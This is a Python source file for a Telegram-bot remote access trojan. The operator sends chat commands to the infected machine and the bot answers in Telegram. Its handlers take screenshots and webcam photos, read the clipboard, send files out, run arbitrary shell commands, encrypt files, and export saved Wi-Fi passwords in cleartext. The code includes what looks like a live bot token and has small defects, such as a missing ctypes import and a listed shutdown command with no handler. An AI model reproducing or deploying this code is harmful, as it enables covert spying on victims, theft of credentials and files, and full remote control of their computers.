import os
import re
import mss
import cv2
import time
import pyttsx3
import telebot
import platform
import clipboard
import subprocess
import pyAesCrypt
import xml.etree.ElementTree as ET
from secure_delete import secure_delete

TOKEN = '6422043955:AAHkYA7hVMli-WaCR70kUhkh4vmFozXu9nA'

bot = telebot.TeleBot(TOKEN)
cd = os.path.expanduser("~")
secure_delete.secure_random_seed_init()
bot.set_webhook()

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'The bot is ready, Lets have some fun...')

@bot.message_handler(commands=['help'])
def help_msg(message):
    help_text = (
        'Send /screen to capture screenshot.\n'
        '/sys to get system information.\n'
        '/ip to get IP address.\n'
        '/cd to navigate in folders.\n'
        '/ls for list elements.\n'
        '/upload [path] to get file.\n'
        '/crypt [path] to encrypt folder files.\n'
        '/decrypt [path] to decrypt folder files.\n'
        '/webcam\n'
        '/lock\n'
        '/clipboard\n'
        '/shell\n'
        '/wifi\n'
        '/speech [hi]\n'
        '/shutdown'
    )
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['screen'])
def send_screen(message):
    with mss.mss() as sct:
        sct.shot(output=f"{cd}\\capture.png")
    image_path = f"{cd}\\capture.png"
    with open(image_path, "rb") as photo:
        bot.send_photo(message.chat.id, photo)

@bot.message_handler(commands=['ip'])
def send_ip_info(message):
    try:
        command_ip = "curl ipinfo.io/ip"
        result = subprocess.check_output(command_ip, shell=True)
        public_ip = result.decode("utf-8").strip()
        bot.send_message(message.chat.id, public_ip)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['sys'])
def send_system_info(message):
    system_info = {
        'Platform': platform.platform(),
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
    }
    sys_info_text = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
    bot.send_message(message.chat.id, sys_info_text)

@bot.message_handler(commands=['cd'])
def change_directory(message):
    try:
        path = message.text.split()[1]
        os.chdir(path)
        bot.send_message(message.chat.id, f"Changed directory to {os.getcwd()}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['ls'])
def list_directory(message):
    try:
        files = os.listdir(os.getcwd())
        bot.send_message(message.chat.id, "\n".join(files))
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['upload'])
def upload_file(message):
    try:
        path = message.text.split()[1]
        with open(path, "rb") as file:
            bot.send_document(message.chat.id, file)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['crypt'])
def encrypt_files(message):
    try:
        path = message.text.split()[1]
        password = "password"  # Replace with a secure way to handle passwords
        pyAesCrypt.encryptFile(path, path + ".aes", password)
        bot.send_message(message.chat.id, f"Encrypted {path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['decrypt'])
def decrypt_files(message):
    try:
        path = message.text.split()[1]
        password = "password"  # Replace with a secure way to handle passwords
        pyAesCrypt.decryptFile(path, path[:-4], password)
        bot.send_message(message.chat.id, f"Decrypted {path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['webcam'])
def capture_webcam(message):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            img_path = f"{cd}\\webcam.jpg"
            cv2.imwrite(img_path, frame)
            with open(img_path, "rb") as photo:
                bot.send_photo(message.chat.id, photo)
        cap.release()
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['lock'])
def lock_system(message):
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.LockWorkStation()
        elif platform.system() == "Linux":
            subprocess.run(['gnome-screensaver-command', '-l'])
        elif platform.system() == "Darwin":
            subprocess.run(['/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession', '-suspend'])
        bot.send_message(message.chat.id, "System locked.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['clipboard'])
def send_clipboard_content(message):
    try:
        clip_content = clipboard.paste()
        bot.send_message(message.chat.id, clip_content)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['shell'])
def execute_shell_command(message):
    try:
        command = message.text.split(' ', 1)[1]
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if stdout:
            output = stdout.decode('utf-8', errors='ignore')
            send_long_message(message.chat.id, f"Command output:\n{output}")
        if stderr:
            error_output = stderr.decode('utf-8', errors='ignore')
            send_long_message(message.chat.id, f"Command error output:\n{error_output}")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

def send_long_message(user_id, message_text):
    part_size = 4000  
    message_parts = [message_text[i:i+part_size] for i in range(0, len(message_text), part_size)]
    for part in message_parts:
        bot.send_message(user_id, part)

@bot.message_handler(commands=['wifi'])
def get_wifi_passwords(message):
    try:
        output_dir = cd  # You can specify a different directory if needed
        result = subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear', f'folder={output_dir}', 'overwrite=yes'], shell=True, text=True, capture_output=True)
        if result.returncode != 0:
            bot.send_message(message.chat.id, f"Error exporting Wi-Fi profiles: {result.stderr}")
            return
        
        # Look for the exported XML files in the specified directory
        found_profiles = False
        for filename in os.listdir(output_dir):
            if filename.endswith(".xml"):
                found_profiles = True
                with open(os.path.join(output_dir, filename), 'r') as file:
                    xml_content = file.read()
                ssid_match = re.search(r'<name>(.*?)</name>', xml_content)
                password_match = re.search(r'<keyMaterial>(.*?)</keyMaterial>', xml_content)
                if ssid_match and password_match:
                    ssid = ssid_match.group(1)
                    password = password_match.group(1)
                    message_text = f"SSID: {ssid}\nPASS: {password}"
                    bot.send_message(message.chat.id, message_text)
                try:
                    os.remove(os.path.join(output_dir, filename))
                except Exception as e:
                    bot.send_message(message.chat.id, f"Error removing XML file: {str(e)}")
        if not found_profiles:
            bot.send_message(message.chat.id, "Wi-Fi profiles not found.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

if __name__ == "__main__":
    print('Waiting for commands...')
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"Error: {str(e)}")
            time.sleep(10)
